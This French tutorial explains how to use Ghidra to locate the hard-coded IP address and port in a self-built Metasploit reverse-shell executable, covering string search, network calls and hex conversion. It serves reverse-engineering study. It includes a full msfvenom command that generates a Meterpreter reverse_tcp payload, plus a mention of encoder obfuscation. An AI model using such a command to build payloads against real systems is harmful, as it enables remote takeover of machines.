### Étapes pour analyser l’exécutable avec Ghidra

1. **Installation de Ghidra**
   - Si ce n’est pas déjà fait, télécharge Ghidra depuis le site officiel (https://ghidra-sre.org/) et installe-le. C’est gratuit et compatible avec Windows, Linux ou macOS.

2. **Importation de l’exécutable**
   - Ouvre Ghidra et crée un nouveau projet via "File > New Project".
   - Importe ton exécutable (par exemple, `reverse.exe`) en allant dans "File > Import File". Sélectionne le fichier et confirme.

3. **Analyse automatique**
   - Une fois l’exécutable importé, double-clique dessus dans la fenêtre du projet pour ouvrir l’outil "CodeBrowser".
   - Ghidra te demandera de lancer l’analyse. Clique sur "Yes" pour qu’il désassemble le code et identifie les fonctions automatiquement. Laisse les options par défaut pour l’instant.

4. **Recherche de l’adresse IP**
   - **Vue Listing (code assembleur)** :
     - Dans la fenêtre principale, tu verras le code désassemblé. Cherche des appels réseau comme `connect`, `socket`, ou `WSAStartup` (pour Windows), car un reverse shell doit établir une connexion.
     - L’adresse IP est souvent passée en paramètre avant l’appel à `connect`. Elle peut apparaître sous forme hexadécimale (par exemple, `192.168.1.1` devient `0xC0A80101`).
   - **Vue Decompile (pseudo-code C)** :
     - À droite, la fenêtre "Decompile" traduit le code en pseudo-C. Cherche une variable ou une structure contenant une IP ou un port (comme `4444` si tu as utilisé ce port).
   - **Recherche de chaînes** :
     - Va dans "Search > For Strings" (ou Ctrl+E) et coche "Search All". Cherche des motifs comme "192.168." ou une suite de nombres ressemblant à une IP. Si Metasploit n’a pas obfusqué l’IP, elle peut être en clair.
   - **Conversion hexadécimale** :
     - Si tu trouves une valeur comme `0xC0A80101`, convertis-la :
       - `C0` = 192, `A8` = 168, `01` = 1, `01` = 1 → `192.168.1.1`.
       - Note que l’ordre peut être inversé selon l’endianness (little-endian sur x86).

5. **Exemple concret**
   - Si ton payload a été généré avec `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o reverse.exe` :
     - Cherche `0x6401A8C0` (192.168.1.100 en hexadécimal) dans le code assembleur près d’un `push` ou `mov`.
     - Le port (comme `4444`, soit `0x115C` en hexadécimal) sera souvent à proximité.

6. **Validation**
   - Une fois l’IP trouvée (par exemple, "192.168.1.100"), compare-la avec celle que tu as définie dans `LHOST`. Si elles correspondent, tu as réussi !

### Astuces
- Si l’exécutable utilise un encodeur (comme `shikata_ga_nai`), l’IP peut être cachée dans une routine de décodage. Cherche alors le point où le payload est décodé avant l’appel réseau.
- Utilise la vue "Function Call Graph" pour repérer les fonctions réseau clés.

